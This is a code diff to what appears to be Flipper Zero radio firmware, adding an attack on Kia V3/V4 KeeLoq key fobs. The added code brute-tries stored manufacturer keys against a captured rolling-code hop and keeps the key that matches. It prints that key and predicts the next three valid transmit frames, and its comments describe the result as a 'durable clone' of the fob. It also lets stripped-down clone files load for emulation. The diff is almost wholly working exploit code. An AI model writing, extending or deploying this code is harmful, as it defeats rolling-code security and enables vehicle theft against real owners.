@@ -49,7 +49,14 @@ typedef struct SubGhzProtocolDecoderKiaV3V4 {
     uint32_t decrypted;
     uint8_t crc;
     uint8_t version;
+    // Recovered KIA_KEY1 manufacturer key the captured hop decrypts under
+    // (0 => not recovered / not in keystore => replay-only). Set by the
+    // try-all-keystore-keys loop in kia_v3_v4_process_buffer; re-derived
+    // lazily in get_string when a .sub is loaded (deserialize path).
+    uint64_t mf_key;
 } SubGhzProtocolDecoderKiaV3V4;
+
+#define KIA_V3_V4_PREDICT_COUNT 3U
 
 typedef struct SubGhzProtocolEncoderKiaV3V4 {
     SubGhzProtocolEncoderBase base;
@@ -153,12 +160,15 @@ static bool kia_v3_v4_process_buffer(SubGhzProtocolDecoderKiaV3V4* instance) {
     // KeeLoq decrypt is self-consistent (top nibble == button, disc byte ==
     // serial LSB). A single last-wins key would shadow all the others.
     uint32_t decrypted = 0;
+    uint64_t matched_key = 0;
     bool key_ok = false;
     uint8_t nkeys = get_kia_mf_key_count();
     for(uint8_t ki = 0; ki < nkeys; ki++) {
-        uint32_t d = subghz_protocol_keeloq_common_decrypt(encrypted, get_kia_mf_key_at(ki));
+        uint64_t k = get_kia_mf_key_at(ki);
+        uint32_t d = subghz_protocol_keeloq_common_decrypt(encrypted, k);
         if(((d >> 28) & 0x0F) == btn && ((d >> 16) & 0xFF) == our_serial_lsb) {
             decrypted = d;
+            matched_key = k;
             key_ok = true;
             break;
         }
@@ -167,6 +177,10 @@ static bool kia_v3_v4_process_buffer(SubGhzProtocolDecoderKiaV3V4* instance) {
         return false;
     }
 
+    // Manufacturer key RECOVERED: the captured hop decrypts self-consistently
+    // (button nibble + disc byte pinned to the observed serial). This makes the
+    // fob a durable clone -> get_string surfaces the key and predicts Next+i.
+    instance->mf_key = matched_key;
     instance->encrypted = encrypted;
     instance->decrypted = decrypted;
     instance->crc = crc;
@@ -462,10 +476,33 @@ SubGhzProtocolStatus
         uint32_t btn = UINT32_MAX;
         uint32_t cnt = UINT32_MAX;
         pp_encoder_read_fields(flipper_format, &serial, &btn, &cnt, NULL);
-        if(serial == UINT32_MAX || btn == UINT32_MAX || cnt == UINT32_MAX) break;
+
+        // ford_v0-style tolerance: Serial and Btn ride in the CLEAR inside the
+        // 68-bit Key (on-air bytes 4-7 == serial_btn). A clone .sub that stores
+        // only Protocol/Bit/Key (no Serial/Btn/Cnt fields) previously hit the
+        // hard `== UINT32_MAX -> break` here and failed emulate with "Error in
+        // protocol parameters". Instead re-derive any omitted field from the Key
+        // exactly the way the decoder extracted it, so the emitted frame stays
+        // byte-identical to the capture. Only a missing Key/Bit (checked above)
+        // is genuinely unusable.
+        if(serial == UINT32_MAX || btn == UINT32_MAX) {
+            const uint8_t kb4 = (uint8_t)(instance->generic.data >> 24);
+            const uint8_t kb5 = (uint8_t)(instance->generic.data >> 16);
+            const uint8_t kb6 = (uint8_t)(instance->generic.data >> 8);
+            const uint8_t kb7 = (uint8_t)(instance->generic.data);
+            const uint32_t serial_btn = ((uint32_t)pp_reverse_bits8(kb7) << 24) |
+                                        ((uint32_t)pp_reverse_bits8(kb6) << 16) |
+                                        ((uint32_t)pp_reverse_bits8(kb5) << 8) |
+                                        (uint32_t)pp_reverse_bits8(kb4);
+            if(serial == UINT32_MAX) serial = serial_btn & 0x0FFFFFFFU;
+            if(btn == UINT32_MAX) btn = (serial_btn >> 28) & 0x0FU;
+        }
+        // Cnt lives inside the encrypted hop; if the clone omitted it, recover it
+        // from the matched-key decrypt below (real counter) rather than rejecting.
+        const bool cnt_absent = (cnt == UINT32_MAX);
         instance->serial = serial;
-        instance->btn = (uint8_t)btn;
-        instance->cnt = (uint16_t)cnt;
+        instance->btn = (uint8_t)(btn & 0x0F);
+        instance->cnt = cnt_absent ? 0U : (uint16_t)cnt;
         instance->generic.serial = instance->serial;
         instance->generic.btn = instance->btn;
         instance->generic.cnt = instance->cnt;
@@ -499,6 +536,13 @@ SubGhzProtocolStatus
                     instance->plain_captured = d;
                     break;
                 }
+            }
+            // Clone omitted Cnt: adopt the real captured counter (low 16 bits of
+            // the recovered plaintext) so the +1 auto-advance below rolls to the
+            // next VALID hop instead of a fabricated counter.
+            if(cnt_absent && instance->matched_mf_key) {
+                instance->cnt = (uint16_t)(instance->plain_captured & 0xFFFFU);
+                instance->generic.cnt = instance->cnt;
             }
         }
 
@@ -697,6 +741,7 @@ void kia_protocol_decoder_v3_v4_reset(void* context) {
     instance->header_count = 0;
     instance->raw_bit_count = 0;
     instance->crc = 0;
+    instance->mf_key = 0;
     memset(instance->raw_bits, 0, sizeof(instance->raw_bits));
 }
 
@@ -907,6 +952,25 @@ static uint64_t compute_yek(uint64_t key) {
     return yek;
 }
 
+// Build the full 68-bit on-air frame word (same byte packing as the encoder's
+// build_packet) for a given encrypted hop + serial/button. Used by the Next+i
+// predictor so each predicted line is a ready-to-load/emulate frame.
+static uint64_t kia_v3_v4_pack_frame(uint32_t encrypted, uint32_t serial, uint8_t btn) {
+    uint8_t rb[8];
+    rb[0] = pp_reverse_bits8((encrypted >> 0) & 0xFF);
+    rb[1] = pp_reverse_bits8((encrypted >> 8) & 0xFF);
+    rb[2] = pp_reverse_bits8((encrypted >> 16) & 0xFF);
+    rb[3] = pp_reverse_bits8((encrypted >> 24) & 0xFF);
+    uint32_t serial_btn = (serial & 0x0FFFFFFFU) | ((uint32_t)(btn & 0x0FU) << 28);
+    rb[4] = pp_reverse_bits8((serial_btn >> 0) & 0xFF);
+    rb[5] = pp_reverse_bits8((serial_btn >> 8) & 0xFF);
+    rb[6] = pp_reverse_bits8((serial_btn >> 16) & 0xFF);
+    rb[7] = pp_reverse_bits8((serial_btn >> 24) & 0xFF);
+    return ((uint64_t)rb[0] << 56) | ((uint64_t)rb[1] << 48) | ((uint64_t)rb[2] << 40) |
+           ((uint64_t)rb[3] << 32) | ((uint64_t)rb[4] << 24) | ((uint64_t)rb[5] << 16) |
+           ((uint64_t)rb[6] << 8) | (uint64_t)rb[7];
+}
+
 void kia_protocol_decoder_v3_v4_get_string(void* context, FuriString* output) {
     furi_check(context);
     SubGhzProtocolDecoderKiaV3V4* instance = context;
@@ -934,4 +998,48 @@ void kia_protocol_decoder_v3_v4_get_string(void* context, FuriString* output) {
         instance->generic.btn,
         instance->generic.cnt,
         instance->crc);
+
+    // Manufacturer-key recovery. When a captured hop was decoded live the key is
+    // already known (instance->mf_key); a loaded .sub restores encrypted+serial+
+    // btn but not mf_key, so re-run the same try-all-keys/invariant here to
+    // recover it. If none matches the frame is replay-only (key not in keystore).
+    uint64_t mf_key = instance->mf_key;
+    uint32_t plain = instance->decrypted;
+    if(mf_key == 0 && instance->encrypted != 0) {
+        uint8_t ser_lsb = (uint8_t)(instance->generic.serial & 0xFF);
+        uint8_t btn = (uint8_t)(instance->generic.btn & 0x0F);
+        uint8_t nk = get_kia_mf_key_count();
+        for(uint8_t ki = 0; ki < nk; ki++) {
+            uint64_t k = get_kia_mf_key_at(ki);
+            uint32_t d = subghz_protocol_keeloq_common_decrypt(instance->encrypted, k);
+            if(((d >> 28) & 0x0F) == btn && ((d >> 16) & 0xFF) == ser_lsb) {
+                mf_key = k;
+                plain = d;
+                break;
+            }
+        }
+    }
+
+    if(mf_key != 0) {
+        // Recovered: surface the effective manufacturer key + decoded counter,
+        // then predict the next few hops by re-encrypting plaintext with cnt+i
+        // under the recovered key (rolls ONLY the 16-bit counter, keeping every
+        // discrimination bit). Each Next+i is a ready-to-load/emulate frame word.
+        furi_string_cat_printf(
+            output,
+            "MfKey:%016llX Cnt:%u\r\n",
+            (unsigned long long)mf_key,
+            (unsigned int)(plain & 0xFFFFU));
+        for(uint16_t i = 1; i <= KIA_V3_V4_PREDICT_COUNT; i++) {
+            uint16_t cnt_next = (uint16_t)((plain & 0xFFFFU) + i);
+            uint32_t plain_next = (plain & 0xFFFF0000U) | (uint32_t)cnt_next;
+            uint32_t enc_next = subghz_protocol_keeloq_common_encrypt(plain_next, mf_key);
+            uint64_t frame = kia_v3_v4_pack_frame(enc_next, instance->generic.serial,
+                                                  (uint8_t)instance->generic.btn);
+            furi_string_cat_printf(
+                output, "Next+%u:%016llX\r\n", (unsigned int)i, (unsigned long long)frame);
+        }
+    } else {
+        furi_string_cat_printf(output, "Key: not in keystore (replay-only)\r\n");
+    }
 }
